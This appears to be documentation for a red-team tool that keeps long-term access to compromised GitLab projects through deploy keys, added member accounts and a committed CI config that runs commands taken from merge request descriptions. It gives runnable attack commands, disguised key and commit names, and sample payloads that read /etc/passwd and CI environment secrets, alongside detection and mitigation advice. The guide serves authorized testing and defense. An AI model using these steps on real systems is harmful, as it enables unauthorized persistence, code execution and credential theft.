---
title: Persistence Techniques
description: Establish and maintain long-term access to GitLab projects using deploy keys, member additions, and MR-triggered pipelines
---

This guide walks through persistence techniques for maintaining access to GitLab projects after initial compromise. These techniques are designed to survive credential rotation and provide redundant access paths.

> **Note**: This guide is for authorized security testing only. Always ensure you have proper permission before using these techniques.

## Overview

After gaining initial access to a GitLab project (typically via a compromised PAT), an attacker can establish persistence through three independent mechanisms:

| Technique | Survives Token Rotation | Access Type | Minimum Token Scope |
|-----------|------------------------|-------------|---------------------|
| Deploy Key | Yes | Git clone/push via SSH | `api` + project Maintainer role |
| Member Addition | Yes | Full GitLab access for added user | `api` + project Maintainer role |
| MR Pwn Request | Yes | Command execution via CI | `api` + `write_repository` |

Each technique is independent — combining all three creates a resilient persistence chain.

## Scenario: Full Persistence Chain

### Prerequisites

- A compromised GitLab PAT with `api` and `write_repository` scopes
- Maintainer-level access to the target project
- A target project with self-hosted runners (for CI execution)

### Step 1: Enumerate the target

```bash
export GITLAB_TOKEN=<compromised_token>

# Confirm access and identify CI configuration
gogatoz enumerate -p group/project --json
```

Verify the project has:
- Self-hosted runners (check for runner tags in findings)
- CI/CD enabled

### Step 2: Deploy key persistence

Create a deploy key that provides Git-level access independent of any user token:

```bash
gogatoz attack --target group/project --deploy-key \
  --key-path ./deploy_key --key-title "CI/CD Integration Key"
```

Save the deploy key ID from the output — you'll need it for cleanup.

Verify access:

```bash
GIT_SSH_COMMAND="ssh -i ./deploy_key -o StrictHostKeyChecking=no" \
  git clone git@gitlab.local:group/project.git
```

### Step 3: Member addition persistence

Add a controlled account as a project member:

```bash
gogatoz attack --target group/project --add-member \
  --member-username backup_account --member-role developer
```

This grants the `backup_account` user independent access to the project through the GitLab web UI and API.

### Step 4: MR pwn request persistence

Commit a CI config that provides on-demand command execution through merge requests:

```bash
gogatoz attack --commit-ci --target group/project \
  --payload pwn-request --tags shell_executor \
  --branch feature/ci-lint-checks --deconflict suffix \
  --message "Add CI lint checks"
```

To execute commands later, create an MR against the project with a description like:

```
Routine linting update

CMD: cat /etc/passwd > output.txt
```

### Step 5: Verify persistence chain

After establishing all three mechanisms, verify each one works independently:

1. **Deploy key**: Clone the repo using the SSH key
2. **Member account**: Log in as the added user and access the project
3. **MR pwn**: Create a test MR and verify the CI job triggers

### Step 6: Cleanup

Remove all persistence artifacts after testing:

```bash
gogatoz attack --target group/project --cleanup \
  --revoke-deploy-key 42 \
  --remove-member-id 15 \
  --cleanup-branch feature/ci-lint-checks \
  --cleanup-ci --branch feature/ci-lint-checks
```

## Individual Technique Deep Dives

### Deploy Key Attack Flow

Deploy keys are SSH keys associated with a project rather than a user. When created with push access, they allow cloning and pushing to the repository.

**Why it persists**: Deploy keys are not affected by user token rotation, password changes, or MFA enforcement. They exist at the project level.

**Detection**: Check project Settings > Repository > Deploy Keys. Monitor `audit_events` for `deploy_key_created` events.

```bash
# Attack
gogatoz attack --target group/project --deploy-key \
  --key-path ./dk --key-title "Monitoring Hook"

# Verify
GIT_SSH_COMMAND="ssh -i ./dk" git ls-remote git@gitlab.local:group/project.git

# Cleanup
gogatoz attack --target group/project --cleanup --revoke-deploy-key <ID>
```

### Member Addition Attack Flow

Adding a controlled user account provides full GitLab access (web UI, API, Git) at the granted permission level.

**Why it persists**: The added user has independent credentials. Rotating the original compromised token does not affect the added member.

**Detection**: Check project Settings > Members. Monitor `audit_events` for `member_created` events.

```bash
# Attack
gogatoz attack --target group/project --add-member \
  --member-username attacker_account --member-role maintainer

# Cleanup
gogatoz attack --target group/project --cleanup --remove-member-id <USER_ID>
```

### MR Pwn Request Attack Flow

The MR pwn request commits a CI config that extracts and executes commands from MR descriptions. This provides on-demand code execution without needing direct API access.

**Why it persists**: The CI config remains in the repository. Any user who can create an MR can trigger command execution — even if the original attacker's token is revoked.

**Detection**: Review `.gitlab-ci.yml` for jobs triggered by `merge_request_event` that parse `$CI_MERGE_REQUEST_DESCRIPTION`. Look for `sed`, `eval`, or `bash -lc` in script blocks.

```bash
# Attack
gogatoz attack --commit-ci --target group/project \
  --payload pwn-request --tags shell_executor \
  --branch feature/quality-gates

# Verify by creating an MR with description:
# CMD: id; hostname; env | grep CI_

# Cleanup
gogatoz attack --target group/project --cleanup \
  --cleanup-ci --branch feature/quality-gates \
  --cleanup-branch feature/quality-gates
```

## Credential Rotation Survival

This table shows which persistence techniques survive each defensive action:

| Defensive Action | Deploy Key | Added Member | MR Pwn Request |
|-----------------|-----------|-------------|----------------|
| Rotate compromised PAT | Survives | Survives | Survives |
| Change user password | Survives | Survives | Survives |
| Enable MFA | Survives | Partial (user must set up MFA) | Survives |
| Remove user from project | Survives | Removed | Survives |
| Revoke deploy keys | Removed | Survives | Survives |
| Delete attack branch | Survives | Survives | Removed |
| All three combined | Removed | Removed | Removed |

## Mitigation Recommendations

1. **Audit regularly**: Review project deploy keys, members, and CI configs periodically
2. **Monitor audit events**: Set up alerts for `deploy_key_created`, `member_created`, and CI file changes
3. **Require MR approval for CI changes**: Use CODEOWNERS to require review for `.gitlab-ci.yml` modifications
4. **Limit Maintainer access**: Only grant Maintainer role to users who need it
5. **Use protected branches**: Prevent direct pushes to important branches
6. **Review merge request pipelines**: Audit CI jobs triggered by `merge_request_event`

## See Also

- [Persistence Command Reference](/user-guide/command-reference/persistence/) for all flags and options
- [Post-Compromise Enumeration](/user-guide/use-cases/post-compromise/) for initial access workflows
- [Runner Takeover](/user-guide/use-cases/runner-takeover/) for self-hosted runner exploitation
